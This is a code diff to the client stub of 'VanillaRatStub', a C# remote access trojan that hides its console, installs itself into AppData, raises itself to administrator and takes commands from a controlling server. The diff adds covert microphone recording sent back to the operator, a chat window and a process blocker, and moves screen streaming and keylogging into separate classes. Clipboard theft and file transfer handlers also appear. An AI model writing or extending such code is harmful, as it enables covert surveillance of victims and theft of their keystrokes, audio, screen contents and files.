@@ -1,8 +1,8 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
-using System.Drawing.Imaging;
+using System.Diagnostics.Eventing.Reader;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -10,36 +10,35 @@ using System.Security.Permissions;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
-using Microsoft.Win32;
-using StreamLibrary;
-using StreamLibrary.UnsafeCodecs;
 using Telepathy;
+using VanillaRatStub.Forms;
 using VanillaRatStub.InformationHelpers;
 using static System.Windows.Forms.Application;
 using Message = Telepathy.Message;
 using ThreadState = System.Threading.ThreadState;
+using Timer = System.Threading.Timer;
 
 namespace VanillaRatStub
 {
     internal class Program
     {
-        private const int SW_HIDE = 0;
-        private const int SW_SHOW = 5;
+        private const int SW_HIDE = 0; //Hide console
+        private const int SW_SHOW = 5; //Show console
+        private const uint ATTACH_PARENT_PROCESS = 0x0ffffffff; //Attach console back to parent process
         private static string CurrentDirectory = string.Empty;
-        private static bool RDActive;
-        private static bool USActive;
-        private static bool KLActive;
         private static bool ARActive;
         private static bool ReceivingFile;
         private static string FileToWrite = "";
-        private static int UpdateInterval;
-
+        private static int UpdateInterval;        
+        private static bool CActive;
+        private static bool APDisabled;
+        private static Thread ChatThread = new Thread(OpenChatForm);
+        private static ChatInterface CI;
         private static readonly string InstallDirectory =
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
             AppDomain.CurrentDomain.FriendlyName;
-
-        private static ApplicationContext MsgLoop;
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetConsoleWindow();
@@ -47,19 +46,17 @@ namespace VanillaRatStub
         [DllImport("user32.dll")]
         private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
-        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput,
-            IntPtr lpInitData);
+        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
 
-        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        internal static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight,
-            [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
+        [DllImport("kernel32.dll")]
+        private static extern bool FreeConsole();
 
-        [DllImport("gdi32.dll")]
-        internal static extern bool DeleteDC([In] IntPtr hdc);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool AttachConsole(uint dwProcessId);
 
         #region Connection & Data Loop
+
         //Try to connect to main server
         private static void Connect()
         {
@@ -79,6 +76,7 @@ namespace VanillaRatStub
         #endregion Connection & Data Loop
 
         #region Entry Point
+
         //Check if it is installed
         private static bool IsInstalled()
         {
@@ -86,6 +84,7 @@ namespace VanillaRatStub
                 return true;
             return false;
         }
+
         //Raise to admin
         private static void RaisePerms()
         {
@@ -96,18 +95,24 @@ namespace VanillaRatStub
             P.Start();
             Environment.Exit(0);
         }
+
         //Check if admin
         private static bool IsAdmin()
         {
             return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                 .IsInRole(WindowsBuiltInRole.Administrator);
         }
+
         //Check settings and start connect
         private static void Main(string[] args)
         {
             UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
+            FreeConsole();
+            ShowWindow(handle, SW_SHOW);
+            EnableVisualStyles();
+            CI = new ChatInterface();
             if (ClientSettings.Install == "True" && !IsInstalled())
             {
                 if (!IsAdmin())
@@ -146,6 +151,7 @@ namespace VanillaRatStub
             Connect();
             Console.ReadKey();
         }
+
         //Uninstall client
         private static void UninstallClient()
         {
@@ -237,12 +243,7 @@ namespace VanillaRatStub
                 ReceivingFile = false;
                 return;
             }
-
             string StringForm = string.Empty;
-            Thread StreamThread = new Thread(StreamScreen);
-            Thread UsageThread = new Thread(StreamUsage);
-            Thread KeyloggerThread = new Thread(StreamKeys);
-            KeyloggerThread.IsBackground = true;
             try
             {
                 StringForm = Encoding.ASCII.GetString(RawData);
@@ -254,8 +255,15 @@ namespace VanillaRatStub
 
             if (StringForm == "KillClient")
             {
+                if (ChatThread.ThreadState == ThreadState.Running)
+                {
+                    CloseChatForm();
+                }
                 UninstallClient();
-                Environment.Exit(0);
+                try
+                {
+                    Process.GetCurrentProcess().Kill();
+                } catch { Environment.Exit(0); }
             }
             else if (StringForm == "DisconnectClient")
             {
@@ -318,13 +326,11 @@ namespace VanillaRatStub
             }
             else if (StringForm.Equals("StartRD"))
             {
-                RDActive = true;
-                if (StreamThread.ThreadState != ThreadState.Running) StreamThread.Start();
+                RemoteDesktopStream.Start();
             }
             else if (StringForm.Equals("StopRD"))
             {
-                RDActive = false;
-                if (StreamThread.ThreadState == ThreadState.Running) StreamThread.Abort();
+                RemoteDesktopStream.Stop();
             }
             else if (StringForm.Equals("GetProcesses"))
             {
@@ -457,7 +463,6 @@ namespace VanillaRatStub
                     {
                         FileBytes = new byte[FS.Length];
                         FS.Read(FileBytes, 0, FileBytes.Length);
-                        FS.Close();
                     }
 
                     List<byte> ToSend = new List<byte>();
@@ -536,7 +541,7 @@ namespace VanillaRatStub
                 {
                     string ClipboardText = "Clipboard is empty or contains an invalid data type.";
                     Thread STAThread = new Thread(
-                        delegate()
+                        delegate ()
                         {
                             if (Clipboard.ContainsText(TextDataFormat.Text))
                                 ClipboardText = Clipboard.GetText(TextDataFormat.Text);
@@ -555,121 +560,160 @@ namespace VanillaRatStub
             }
             else if (StringForm.Equals("StartUsageStream"))
             {
-                USActive = true;
-                if (UsageThread.ThreadState != ThreadState.Running) UsageThread.Start();
+                HardwareUsageStream.Start();
             }
             else if (StringForm.Equals("StopUsageStream"))
             {
-                USActive = false;
-                if (UsageThread.ThreadState == ThreadState.Running) UsageThread.Abort();
+                HardwareUsageStream.Stop();
             }
             else if (StringForm.Equals("StartKL"))
             {
-                Keylogger.SendKeys = true;
-                KLActive = true;
-                if (KeyloggerThread.ThreadState != ThreadState.Running) KeyloggerThread.Start();
+                KeyloggerStream.Start();
             }
             else if (StringForm.Equals("StopKL"))
             {
-                Keylogger.SendKeys = false;
-                KLActive = false;
-                if (KeyloggerThread.ThreadState == ThreadState.Running) KeyloggerThread.Abort();
-            } else if (StringForm.Equals("StartAR"))
-            {
+                KeyloggerStream.Stop();
+            }
+            else if (StringForm.Equals("StartAR"))
 
-            } else if (StringForm.Equals("StopAR"))
             {
-
+                if (!ARActive)
+                    RecordAudio();
+            }
+            else if (StringForm.Equals("StopAR"))
+            {
+                if (ARActive)
+                    StopRecordAudio();
+            } else if (StringForm.Equals("OpenChat"))
+            {
+                if (!CActive)
+                {
+                    CActive = true;                
+                    CI = new ChatInterface();
+                    ChatThread.Start();
+                }
+            } else if (StringForm.Equals("CloseChat"))
+            {
+                if (CActive)
+                {
+                    CActive = false;
+                    Networking.ChatClosing = true;
+                    Thread.Sleep(200);
+                    CloseChatForm();
+                }
+            } else if (StringForm.Contains("[<MESSAGE>]"))
+            {
+                Networking.CurrentMessage = StringForm.Replace("[<MESSAGE>]", "");
+            } else if (StringForm.Equals("ToggleAntiProcess"))
+            {
+                if (!APDisabled)
+                {
+                    APDisabled = true;
+                    AntiProcess.StartBlock();
+                    List<byte> ToSend = new List<byte>();
+                    ToSend.Add(1); //Notification Type
+                    ToSend.AddRange(Encoding.ASCII.GetBytes("Started Anti-Process."));
+                    Networking.MainClient.Send(ToSend.ToArray());
+                } else if (APDisabled)
+                {
+                    APDisabled = false;
+                    AntiProcess.StopBlock();
+                    List<byte> ToSend = new List<byte>();
+                    ToSend.Add(1); //Notification Type
+                    ToSend.AddRange(Encoding.ASCII.GetBytes("Stopped Anti-Process."));
+                    Networking.MainClient.Send(ToSend.ToArray());
+                }
             }
         }
 
-        #region Audio Recorder        
+        #region Audio Recorder
+
+        //Record Audio
+        public static string AudioPath =
+            Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
+
         private static void RecordAudio()
         {
-
-        }
-        #endregion
-
-        #region Remote Desktop
-
-        //Stream screen to server
-        private static void StreamScreen()
-        {
-            while (RDActive && Networking.MainClient.Connected)
+            try
             {
-                byte[] ImageBytes = null;
-                IUnsafeCodec UC = new UnsafeStreamCodec(75);
-                Bitmap Image = GetDesktopImage();
-                int Width = Image.Width;
-                int Height = Image.Height;
-                BitmapData BD = GetDesktopImage().LockBits(new Rectangle(0, 0, Image.Width, Image.Height),
-                    ImageLockMode.ReadWrite, Image.PixelFormat);
-                using (MemoryStream MS = new MemoryStream())
+                if (!ARActive)
                 {
-                    UC.CodeImage(BD.Scan0, new Rectangle(0, 0, Width, Height), new Size(Width, Height),
-                        Image.PixelFormat, MS);
-                    ImageBytes = MS.ToArray();
+                    Record("open new Type waveaudio Alias recsound", "", 0, 0);
+                    Record("record recsound", "", 0, 0);
+                    if (File.Exists(AudioPath))
+                        File.Delete(AudioPath);
+                    ARActive = true;
                 }
-
-                List<byte> ToSend = new List<byte>();
-                ToSend.Add(0); //Image Type
-                ToSend.AddRange(ImageBytes);
-                Networking.MainClient.Send(ToSend.ToArray());
-                Thread.Sleep(UpdateInterval);
             }
+            catch { }
         }
 
-        //Get image of desktop
-        private static Bitmap GetDesktopImage()
+        //Stop recording audio
+        private static void StopRecordAudio()
         {
-            Rectangle Bounds = Screen.PrimaryScreen.Bounds;
-            Bitmap Screenshot = new Bitmap(Bounds.Width, Bounds.Height, PixelFormat.Format32bppPArgb);
-            using (Graphics G = Graphics.FromImage(Screenshot))
+            try
             {
-                IntPtr DestDeviceContext = G.GetHdc();
-                IntPtr SrcDeviceContext = CreateDC("DISPLAY", null, null, IntPtr.Zero);
-                BitBlt(DestDeviceContext, 0, 0, Bounds.Width, Bounds.Height, SrcDeviceContext, Bounds.X, Bounds.Y,
-                    0x00CC0020);
-                DeleteDC(SrcDeviceContext);
-                G.ReleaseHdc(DestDeviceContext);
+                if (ARActive)
+                {
+                    Record("save recsound " + AudioPath, "", 0, 0);
+                    Record("close recsound", "", 0, 0);
+                    Thread.Sleep(100);
+                    byte[] FileBytes;
+                    using (FileStream FS = new FileStream(AudioPath, FileMode.Open))
+                    {
+                        FileBytes = new byte[FS.Length];
+                        FS.Read(FileBytes, 0, FileBytes.Length);
+                    }
+
+                    List<byte> ToSend = new List<byte>();
+                    ToSend.Add(13); //Audio Recording Type
+                    ToSend.AddRange(FileBytes);
+                    Networking.MainClient.Send(ToSend.ToArray());
+                    File.Delete(AudioPath);
+                    ARActive = false;
+                }
             }
-
-            return Screenshot;
+            catch { }
         }
 
-        #endregion Remote Desktop
+        #endregion Audio Recorder
 
-        #region KL
+        #region Chat
 
-        //Stream keys to server 
-        private static void StreamKeys()
+        //Close chat form
+        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
+        private static void CloseChatForm()
         {
-            Keylogger K = new Keylogger();
-            K.InitKeylogger();
+            try
+            {               
+                ChatThread.Abort();
+                Thread.Sleep(100);
+                ChatThread = new Thread(OpenChatForm);
+                CI = new ChatInterface();
+            }
+            catch 
+            {
+                List<byte> ToSend = new List<byte>();
+                ToSend.Add(1); //Notification type 
+                ToSend.AddRange(Encoding.ASCII.GetBytes("The clients chat could not be closed. Try again."));
+                Networking.MainClient.Send(ToSend.ToArray());
+            }           
         }
 
+        //Open chat form
+        private static void OpenChatForm()
+        {
+            try
+            {
+                CI.ShowDialog();
+                Run(CI);
+            }
+            catch 
+            {
+
+            }          
+        }
         #endregion
-
-        #region UsageStream
-
-        //Stream hardware usage to server
-        private static void StreamUsage()
-        {
-            PerformanceCounter PCCPU = new PerformanceCounter("Processor", "% Processor Time", "_Total");
-            PerformanceCounter PCMEM = new PerformanceCounter("Memory", "Available MBytes");
-            PerformanceCounter PCDISK = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
-            while (USActive && Networking.MainClient.Connected)
-            {
-                string Values = "{" + PCCPU.NextValue() + "}[" + PCMEM.NextValue() + "]<" + PCDISK.NextValue() + ">";
-                List<byte> ToSend = new List<byte>();
-                ToSend.Add(10); //Hardware Usage Type
-                ToSend.AddRange(Encoding.ASCII.GetBytes(Values));
-                Networking.MainClient.Send(ToSend.ToArray());
-                Thread.Sleep(500);
-            }
-        }
-
-        #endregion UsageStream
 
         private static string GetSubstringByString(string a, string b, string c)
         {
